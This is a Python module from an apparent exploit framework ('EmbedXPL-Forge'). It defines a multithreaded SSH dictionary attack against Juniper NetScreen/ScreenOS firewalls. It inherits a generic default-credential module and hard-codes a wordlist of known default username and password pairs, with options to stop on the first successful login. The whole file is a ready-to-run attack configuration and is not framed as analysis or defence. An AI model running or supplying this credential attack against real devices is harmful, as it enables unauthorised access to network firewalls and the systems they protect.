# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    """Juniper NetScreen Default SSH Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Juniper NetScreen Default SSH Credentials",
        "description": (
            "Dictionary attack with default credentials against Juniper NetScreen "
            "legacy appliances (ScreenOS). NetScreen 5GT and 5XT are common SOHO/SMB "
            "firewalls with well-known default credentials. "
            "Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "Juniper NetScreen 5GT / 5XT / 25 / 50",
            "Juniper NetScreen (all ScreenOS models)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "netscreen:netscreen,admin:netscreen,root:netscreen,admin:admin",
        "User:Pass pairs",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
    verbosity = OptBool(True, "Display authentication attempts")
